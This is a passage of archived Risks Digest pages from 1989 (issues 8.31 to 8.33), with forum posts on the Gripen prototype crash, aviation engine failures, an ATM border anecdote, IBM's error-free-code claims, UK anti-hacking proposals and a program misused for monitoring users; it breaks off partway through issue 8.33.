    IS THE NET GOING TO HELL?  ARE THESE RISKS READERS FINDING OTHER SOURCES?
    I AM GIVING UP ON THESE ADDRESSES.  PLEASE NOTIFY YOUR FRIENDS.
    I GOT 400,000 characters in barf mail over the weekend.  PGN]

Message undelivered after 3 days -- will try for another 2 days:
...@VAXA.ISI.EDU: Cannot connect to host
...@lll-crg.llnl.gov.#Internet: Cannot connect to host
...@EWD.DREO.DND.CA: Cannot connect to host
...@LA.TIS.COM.#Internet: Cannot connect to host
...@mitre.arpa: Cannot connect to host
...@xx.drea.dnd.ca: Cannot connect to host
...@red.ipsa.dnd.ca: Cannot connect to host
...@sealion.gcy.nytel.com: Cannot connect to host
...@wr-hits.arpa: Cannot connect to host
...@afsc-bmo.af.mil: Cannot connect to host
...@epsilon.jpl.nasa.gov: Cannot connect to host
risks-p@brl.arpa: 550 (USER) Unknown user name in "risks-p@brl.arpa"

AND THEN I GOT EIGHT COPIES OF THE ENTIRE RISKS MAILING BACK FROM   
Return-Path: &lt;MAILER-DAEMON@cos1.fac.ford.com&gt;
554 mailer mail died with signal 4

THIS IS GETTING MORE AND MORE RIDICULOUS!

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.30.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.32.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-82</DOCNO>
<DOCOLDNO>IA013-000132-B047-21</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.32.html 128.240.150.127 19970217025808 text/html 16075
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:56:37 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 32</TITLE>
<LINK REL="Prev" HREF="/Risks/8.31.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.33.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.31.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.33.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 32</H1>
<H2> Wednesday 1 March 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  RISKS-LIST: On Risks of Running RISKS 
</A>
<DD>
<A HREF="#subj1.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Gripen prototype crash 
</A>
<DD>
<A HREF="#subj2.1">
Dave Newkirk
</A><br>
<A HREF="#subj2.2">
 Kenneth R. Jongsma
</A><br>
<A HREF="#subj2.3">
 Karl Lehenbauer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  A pilot's account of a multi-engine failure 
</A>
<DD>
<A HREF="#subj3.1">
Karl Lehenbauer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Knowing probability just doesn't make a difference 
</A>
<DD>
<A HREF="#subj4.1">
Sumit Dongre
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  A new ATM risk: bureaucracy 
</A>
<DD>
<A HREF="#subj5.1">
Laura Halliday
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  IBM's claims for error-free code 
</A>
<DD>
<A HREF="#subj6.1">
Robert Lee Wilson Jr
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: discussion of computer viruses 
</A>
<DD>
<A HREF="#subj7.1">
Brent Laminack
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Re: [RISKS BARFMAIL] 
</A>
<DD>
<A HREF="#subj8.1">
Robert J. Reschly Jr.
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
RISKS-LIST: On Risks of Running RISKS
</A>
</H3>
<address>
&lt;<A HREF="mailto:Neumann@csl.sri.com">
Neumann@csl.sri.com
</A>&gt;
</address>
<i>
Tue, 28 Feb 89 13:39:49 PST
</i><PRE>

Someone answered mail from RISKS, sending directly to RISKS-LIST@KL.SRI.COM!
Someone else answered that.  It turns out that my macros failed to complete
properly, and consequently a window of vulnerability that permits direct
rebroadcast (because of a TOPS-20 glitch in handling very large lists) remained
open.  I have tried very hard to keep this window narrow, and all other
attempts get indirected to me personally -- so I know if anyone is trying to
hit the window.  I've been lucky -- since August 1985, someone hit the direct
rebroadcast only once before.  And I have not advertisedd the fact that you
should not mail to RISKS-LIST, because I thought that might invite some
nastiness from people who resent moderation.  (Remember, extremism in the
nondefense of moderation is not a virtue.)  But very soon RISKS will move to
another system, and that window of vulnerability will go away -- only to be
replaced by new windows.  So, at any rate, apologies for the confusion, thanks
to those of you who sent me mail on the subject.  Soon we may be onward to
lower-risk RISKS.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Re: Gripen prototype crash (<A HREF="/Risks/8.20.html">RISKS-8.20</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:dcn@hercules.UUCP">
dcn@hercules.UUCP
</A>&gt;
</address>
<i>
Fri, 10 Feb 89 07:44:39 PST
</i><PRE>

I believe the explanation of the recent crash of a Swedish fighter prototype
may be less interesting than the last article implied.  The pilot was flying
the Gripen for his first time, and held the nose too high upon landing.  The
result was exactly as described before - a wobbly landing that caused a
wingtip to hit the runway at about 80 mph.  The plane was damaged and the
pilot survived.  Keep an eye on Aviation Week magazine for a full report.
				Dave Newkirk, att!ihlpm!dcn

</PRE>
<HR><H3><A NAME="subj2.2">
Gripen Crash Blamed on Software
</A>
</H3>
<address>
&lt;<A HREF="mailto:Kenneth_R_Jongsma@cup.portal.com">
Kenneth_R_Jongsma@cup.portal.com
</A>&gt;
</address>
<i>
Tue, 28-Feb-89 06:33:51 PST
</i><PRE>

In a short article in this week's Aviation Week, the following statements
were made:

     Saab Blames Gripen Crash on Software

  The cause of the accident that destroyed the first prototype of the
  Swedish JAS-39 Gripen Multirole combat aircraft has been traced to 
  a software problem, program officials said last week.

  The pilot, Saab-Scania Lars Radestrom, and the aircraft structure and
  subsystems have been cleared of fault based on data developed so far.

  "We consider the problem to be associated with the control software only,"
  one official said.

No addutional details were given.

</PRE>
<HR><H3><A NAME="subj2.3">
Saab blames Gripen crash on software
</A>
</H3>
<address>
Karl Lehenbauer
&lt;<A HREF="mailto:karl%sugar@uunet.UU.NET ">
karl%sugar@uunet.UU.NET 
</A>&gt;
</address>
<i>
1 Mar 89 04:20:00 GMT
</i><PRE>

According to a brief article in Aviation Week and Space Technology (February 
27, 1989, page 31), the accident that destroyed the prototype of Sweden's 
JAS-39 Gripen multirole combat aircraft was caused by a software problem,
according to program officials at Saab.

The article doesn't go into any further detail, other than to say that Saab
officials are working on a revision of the Gripen's flight test program to
complete flight testing with the remaining four prototypes and still meet their
delivery date, which seems extremely optimistic as it is doubtful they have
already determined all the rework that will be required to fix the problems
that caused the crash, including (it appears) the need for a lot more software
QA.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
A pilot's account of a multi-engine failure
</A>
</H3>
<address>
Karl Lehenbauer
&lt;<A HREF="mailto:karl%sugar@uunet.UU.NET ">
karl%sugar@uunet.UU.NET 
</A>&gt;
</address>
<i>
28 Feb 89 05:40:07 GMT
</i><PRE>

Although I RISK becoming known as an "Aviation Week" funnel, the following
letter to the editor (AW&amp;ST January 30, 1989, pg. 88), quoted without
permission, gives a pilot's account of a flight with a multi-engine failure,
which I think may be of interest to RISKS readers:

  Listening to the news reports on the tragic British Midland crash in the U.K.,
  I was struck by the seemingly unanimous conclusions of the aviation gurus
  concerning the near impossibility of a two-engine failure of the Boeing 737
  using the CMF56 engines.

  If the odds on that are improbable, then the flight I had June 14, 1983, was
  even more so.  I was flying as captain for Transamerica Airlines on a
  DC-8/73, newly reengined with the Snecma/GE CMF56s, and had three engines
  fail on me simultaneously during a military passenger flight from Kadena AB,
  Okinawa, to Clark AB in the Philippines.

  I was able to airstart the engines during descent and made a successful
  landing at Clark.  Upon taxi-in the engines again failed, and the fourth
  engine failed as I was parking.

  It was later determined that the probable cause was the specific gravity
  adjustment on the main engine fuel control/MEC was set improperly for the JP
  4 fuel being used.

  My experience certainly shows that aircraft don't listen to the odds of
  probability and that, unfortunately, Murphy's Law is always operative.

					Don Orlando, Concord, CA

I'm surprised they wouldn't shut down the engines immediately after landing,
rather than trying to taxi in, as a precaution, but I have no portfolio in
these matters. 						Karl Lehenbauer

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Knowing probability just doesn't make a difference (Re: <A HREF="/Risks/8.31.html">RISKS-8.31</A>)
</A>
</H3>
<address>
Sumit Dongre
&lt;<A HREF="mailto:dongre@optilink.UUCP ">
dongre@optilink.UUCP 
</A>&gt;
</address>
<i>
28 Feb 89 18:46:19 GMT
</i><PRE>

This is for all you probabilitists (no, it's probably not a word) out there
counting engines on aircraft everytime you get on board.....give it up!!!!

from Aviation Week And Space Techlonlgy : Feb 20, 1989 issue pg 13.
quoted without consent and not for profit...so sue me for nothin'.

"BIRD STIKES CONTINUE to be a cause of aviation accidents worldwide...
...Ethopian Airlines experienced some of the most trouble last year.
In September, an Ethopian Boeing 737 crash killed 31 people after the
aircraft hit birds and damaged both engines during a takeoff from
Bahar Dar, Ethopia.  Earlier in the year an eagle penetrated the
cockpit of an Ethopian 727, breaking the copilot's leg and damaging
flight controls.  The aircraft made a safe emergency landing in
Khartoum, Sudan."

Conclusion :
probability burdens our society(ies) needlessly.
I'll PROBABLY burn in hell for saying that.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
A new ATM risk: bureaucracy
</A>
</H3>
<address>
&lt;<A HREF="mailto:laura_halliday@mtsg.ubc.ca">
laura_halliday@mtsg.ubc.ca
</A>&gt;
</address>
<i>
Tue, 28 Feb 89 15:49:22 PST
</i><PRE>

Yet another ATM risk...in preparation for a brief holiday in Los
Angeles, I elected to change a modest amount of money ahead of
time, and use ATMs for more money as I needed it. 

The U.S. immigration people didn't like this, and I came very close to
having to scrap my holiday. They insist that visitors be able to prove that
they can support themselves while in the U.S.  (a reasonable requirement),
and my bank card wasn't adequate proof (to them) that I could. They
grudgingly let me in to the U.S. after asking pointed questions about who I
was staying with, who she worked for and how much she made. They flatly
insisted that my card meant nothing to them, even when I offered to go to
the nearest ATM (50m away), do a balance inquiry and show them the results.
I could understand them being concerned about me losing my card (a Risk in
its own right). But that wasn't what was bothering them...they were bothered
by somebody supporting herself with technology whose implications they
obviously didn't appreciate.
                                        - laura

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
IBM's claims for error-free code
</A>
</H3>
<address>
Robert Lee Wilson Jr
&lt;<A HREF="mailto:bobw@ford-wdl44 ">
bobw@ford-wdl44 
</A>&gt;
</address>
<i>
Tue, 28 Feb 89 16:20:44 PST
</i><PRE>

The 15 Feb 89 issue of _DATAMATION_ has an article titled "Is Error-Free
Software Achievable?" which praises the Space Shuttle software. (The
article would have one believe that the computing systems on the Space
Shuttle, both hardware and software, are entirely to be credited to IBM. 
How does Big Blue always get errors like this to come out in their favor?)

The article quotes Anthony J. Macina of IBM-Houston: "The development of
error-free software for these complex real-time systems [national defense,
reactor control, air traffic control, and manned space flight] is within
the reach of current software development technology." At the beginning of
the article that is simplified to:
		
			       Is Error-Free
			    Software Achievable?
	The answer is yes, says prime NASA contract developer, IBM.
	And while $1000 per line of code is prohibitively high for
	the average IS shop, some valuable lessons can be learned.

Despite this the article says that the 500,000 lines of source code
"achieved an "exemplary" error rate of .1 errors per thousand lines
of code detected after release." While that is certainly better than
usual code, calling the code "error free", when their own data indicate
fifty errors, is an interesting metric for quality control! 

Bob Wilson, Ford Aerospace Corp., San Jose, CA

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
re: discussion of computer viruses (<A HREF="/Risks/8.31.html">RISKS-8.31</A>)
</A>
</H3>
<address>
Brent Laminack, In Touch Ministries, Atlanta, GA
&lt;<A HREF="mailto:brent@itm.UUCP ">
brent@itm.UUCP 
</A>&gt;
</address>
<i>
28 Feb 89 13:50:26 GMT
</i><PRE>

    Last Sunday's (2/26) comics page had two strips devoted to computer
viruses: "Dick Tracy" and "On The Fast Track".  One fairly serious about a
defense contractor's (Diet Smith) computer, the other humorous about the
virus turning all users into clones of the programming manager (Bud Spore).
Is comics page where most of the population will get most of its information
about viruses?

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
 Re: [RISKS BARFMAIL]
</A>
</H3>
<address>
"Robert J. Reschly Jr." 
&lt;<A HREF="mailto:reschly@BRL.MIL">
reschly@BRL.MIL
</A>&gt;
</address>
<i>
Tue, 28 Feb 89 22:13:35 EST
</i><PRE>

   Yes, the network is going to hell -- or sinking slowly into the muck.  We
(BRL) have have been beating on DCA and BBN as we identify particular
problems.  Only a few other sites/individuals have noticed (and recognised
the underlying problems) as near as I can tell.  I won't go into details
unless you ask for them, but the net result [oof!] is a severe case of
routing instability.  Networks will come and go at random intervals.  We
have also seen some breakdown in the Domain Name System as a result of this;
which only compounds the difficulty.

   As for the specific failure you noted with respect to BRL, our aliases
(mail-ID to mailbox mapping) file got trashed late last week.  The first 160
or so aliases got deleted.  The "postmaster" address also got trashed which
was most disconcerting (made it a real bear to tell us about the troubles
too!.....)

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.31.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.33.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-83</DOCNO>
<DOCOLDNO>IA013-000132-B047-46</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.33.html 128.240.150.127 19970217025822 text/html 22517
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:56:49 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 33</TITLE>
<LINK REL="Prev" HREF="/Risks/8.32.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.34.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.32.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.34.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 33</H1>
<H2> Thursday 2 March 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Viruses and the comics 
</A>
<DD>
<A HREF="#subj1.1">
Jack Holleran
</A><br>
<A HREF="#subj1.2">
 Hope Munro
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Hacking in the movies -- Working Girl 
</A>
<DD>
<A HREF="#subj2.1">
Martin Minow
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Re: British Computer Society policy statement 
</A>
<DD>
<A HREF="#subj3.1">
Clifford Johnson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Hacking and Computer Fraud in the U.K. 
</A>
<DD>
<A HREF="#subj4.1">
Brian Foster
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Knowing probability just doesn't make a difference... 
</A>
<DD>
<A HREF="#subj5.1">
Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Reach Out and Spy on Someone 
</A>
<DD>
<A HREF="#subj6.1">
Pete McVay
</A><br>
<A HREF="#subj6.2">
 Douglas Jones
</A><br>
<A HREF="#subj6.3">
 Emily Lonsford
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  New Sprint Card 
</A>
<DD>
<A HREF="#subj7.1">
Will Martin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  US missile-warning radar endangers friendly aircraft 
</A>
<DD>
<A HREF="#subj8.1">
Ken Arnold
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Error free code and ancient systems 
</A>
<DD>
<A HREF="#subj9.1">
Bill Francis
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
 viruses and the comics
</A>
</H3>
<address>
Jack Holleran 
&lt;<A HREF="mailto:Holleran@DOCKMASTER.ARPA">
Holleran@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Wed, 1 Mar 89 13:30 EST
</i><PRE>

  In comment to Brent Laminack's observation concerning the discussion of
computer viruses (<A HREF="/Risks/8.31.html">RISKS-8.31</A>) in <A HREF="/Risks/8.32.html">RISKS-8.32</A>.

  &gt; Is comics page where most of the population will get most of 
  &gt; its information about viruses?

  If our goals are to make sure the population understands the concept of virus
correctly, AND if we perceive that the population reads comics, why not educate
some of the cartoonists with the correct perceptions and give them some ideas.

  If a person understands the concept, does it matter that the principle
was learned from school or the comic strips?
                                                    Jack Holleran
(Disclaimer:  My opinions only!)

</PRE>
<HR><H3><A NAME="subj1.2">
viruses and comics
</A>
</H3>
<address>
&lt;<A HREF="mailto:Hope.Munro@mac.Dartmouth.EDU">
Hope.Munro@mac.Dartmouth.EDU
</A>&gt;
</address>
<i>
01 Mar 89 21:08:10
</i><PRE>

&gt;Is comics page where most of the population will get most of its information
&gt;about viruses?

Apparently so! I clipped a strip out a few weeks ago which was an installment
of Bloom County.  It depicts Oliver coughing and wheezing, with a head swollen
to resemble his Banana 6000 terminal.  Then he remarks "computer virus".  End
of panel.  Has anyone seen any other examples of viruses in the comic pages?  A
possible topic for the next issue of Detective Comics?  Let's see the Dark
Knight battle these dastardly villians!
                                                       - Hope
Hope.Munro@mac.dartmouth.edu

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Hacking in the movies -- Working Girl
</A>
</H3>
<address>
Repent! Godot is coming soon! Repent!
&lt;<A HREF="mailto:minow%thundr.DEC@decwrl.dec.com ">
minow%thundr.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
2 Mar 89 08:26
</i><PRE>

The current (and quite popular) movie "Working Girl" shows two instances
of unethical access to computers, both by the heroine, and both praised:

-- after being put-upon by her boss, she turns to her terminal and pounds
   briefly on the keyboard.  Immediately, the stock-ticker display that
   circles the room shows a message describing, in somewhat negative and
   explicit terms, his ability to perform sexually.

-- subsequently, she accesses the "personal and confidential" files of
   her new manager's home computer.

Of course, the bosses are nasty, evil creatures and she is the beautiful
heroine who marries the handsome prince; so they deserve what they get.

Martin Minow

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Re: British Computer Society policy statement
</A>
</H3>
<address>
"Clifford Johnson" 
&lt;<A HREF="mailto:GA.CJJ@Forsythe.Stanford.EDU">
GA.CJJ@Forsythe.Stanford.EDU
</A>&gt;
</address>
<i>
Thu,  2 Mar 89 11:11:55 PST
</i><PRE>

&gt; From: Martyn Thomas &lt;mct@praxis.UUCP&gt;
&gt; The BCS recently issued the following policy statement...
&gt; We would welcome constructive criticism of this policy ...
&gt;
&gt; 11 The BCS wishes to emphasise that there is no evidence that
&gt; current SRCS pose a serious threat to the public.  There is
&gt; therefore no cause for alarm, ...

I suggest replacing point 11 with:

  11  The BCS wishes to emphasise that there is some evidence that
  current SRCS pose a serious, growing threat to the public.  There
  is therefore some cause for alarm, ...

In other words, I think the policy statement seriously errs in steering its
course of responsibility with a *political* caution that in the present
social/military context is unfortunately irresponsible.  I think public panic
is a negligible (but might in any case be a beneficial) risk.  Everybody knows
that the world's ecology is headed for disaster at rapid rate, but it's
difficult to get anyone to care enough even to inform themselves further, let
alone to vote to reverse it, let alone to panic.

I think it's not responsible to announce there's "NO evidence" of dangers.
Planes fall out of the sky; in medicine, brains are accidentally fried; the
innocent are jailed; etc.; because of software bugs.  Meanwhile, back at the
ranch, a thousand multi-warheaded ICBMs are poised on a computerized
hair-trigger, ready for instant launch on receipt of a brief, encrypted launch
instruction.  If those who are supposed to sound alarms say there's no evidence
warranting alarm, who will listen closely to the accompanying advice?  If an
alarm is sounded, some people may listen, but panic is most improbable.  In my
opinion, the public needs to be woken up pretty badly.

Could it be that the BCS statement is diercted at management and
industrialists, who would be "turned off" by forthright criticism that
threatens an uncomfortable degree of change, rather than at the public, who
would welcome frankness?

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Hacking and Computer Fraud in the U.K.
</A>
</H3>
<address>
&lt;<A HREF="mailto:blf@scol.UUCP">
blf@scol.UUCP
</A>&gt;
</address>
<i>
Wed Mar  1 16:02:53 1989
</i><PRE>

		Outlaw Computer Hacking -- CBI
		Peter Large, Technology Editor
                (1 March 1989 Guardian newspaper)

  Computer hacking should be made a criminal offence, the CBI said yesterday.

  The employer's organisation said it was vital to secure a stable base for
computer development, since computers played a major part in the nation's
economic competitiveness and "social well-being".  Computer buffs were
increasingly gaining unauthorised access to confidential information held by
banks and other companies in computer databanks, it said.

  Much computer fraud is hidden by firms, but the conservative consensus
estimate is that the cost to British business is at least #30 million a year.

  But computer disasters, caused by software failures, fire and power failures,
are reckoned to be cost about ten times that.

  The CBI, in its response to the Law Commission's paper on computer misuse,
made six proposals:

 * Hacking cases should be tried by jury;

 * The concept of "criminal damage" should cover computer programs and data and
attacks by computer viruses (rogue programs that can disrupt or destroy data);

 * Laws should be harmonised internationally so that hackers cannot operate
across country boundaries;

 * The offence of obtaining unauthorised access should include non-physical
access, such as computer eavesdropping;

 * Even unsuccessful attempts to hack should be subject to criminal sanctions;

 * The value of confidential commercial information should be protected by
civil remedies for loss or damage caused by hackers.

  The US, Canada, Sweden, and France have outlawed hacking, but it is not an
offence in Britain unless damage is done, such as fraud or theft.  Last week
the Jack Report on banking law proposed outlawing the hacker.  The Law
Commission has produced a discussion document and is to make firm proposals
later this year.  

Brian Foster, The Santa Cruz Operation, Ltd., London

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Knowing probability just doesn't make a difference...
</A>
</H3>
<address>
&lt;<A HREF="mailto:henry@utzoo.UUCP">
henry@utzoo.UUCP
</A>&gt;
</address>
<i>
Thu, 2 Mar 89 13:20:33 -0500
</i><PRE>

  &gt;"... earlier in the year an eagle penetrated the cockpit of an ethopian
  &gt;727, breaking the copilot's leg and damaging flight controls...."

it's worth remembering, also, that there's always an unknown risk lurking
around a corner somewhere.  a few months ago, a 747 diverted to gander after
something hit the nose radome and mashed it in, disabling the weather radar.
this was first thought to be a simple birdstrike, albeit a rather large bird
(possibly a goose :-)).  the trouble is, it happened at 33,000 feet! in the
absence of major mountains nearby, that is an *extremely* high altitude for any
bird, especially a big one.  flight international's most recent yearly summary
of commercial flight accidents gives the explanation for that one as "hit
unknown object at 33,000 ft.".
                                     Henry Spencer at U of Toronto Zoology

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Comment: Reach Out and Spy on Someone
</A>
</H3>
<address>
Pete McVay, VRO3-2/E8, 273-5339
&lt;<A HREF="mailto:mcvay%tnt.DEC@decwrl.dec.com ">
mcvay%tnt.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
2 Mar 89 07:24
</i><PRE>

 Back in the days when terminals were hardwired to mainframes and VMS was very
new, I was a part-time system manager for a VAX/VMS in a course development
group.  I needed to know critical information at times, such as what programs
and task were being run, so I could tell if it was safe to reboot the system or
perform other nasty system-management-type tasks.  I wrote an enhancement to
the "SHOW USERS" command which included the user name, image being executed,
amount of logon time, location of the terminal, and other useful tidbits.  By
running this program I could find out what jobs were being done by whom, and
give them phone calls if necessary to see if it was okay to tune the system.

 Some users quickly discovered that the program was useful for spying on each
other.  Two (of about thirty) users were using the program to see what images
were being run, and were reporting users to management by name, claiming they
were abusing the system and hogging valuable resources.  Games were a favorite
target, but major file copy operations and MAIL readings also came under attack.

 My philosophy was (and is) that users are generally responsible persons and
should be consulted in all system policies.  I was also chagrined that my
"innocent" program was now a major police tool.  I removed my program from the
system and deleted all sources.  Unfortunately, backups were religiously done;
these two users convinced management that the program was necessary, so it was
restored.  I resigned my system management duties in protest.  The consequence
was a continuing war on the system, with users hiding the names (or images)
they were running and the new system manager continually trying to ferret out
subterfuge, with stiffer and stiffer penalties...but that is past the scope of
this note.

 Seeing these new spy programs raises the old issues for me.  I can see
their benign intent and usefulness.  Unfortunately, like guns, they become
dangerous and abusive in the wrong hands.

</PRE>
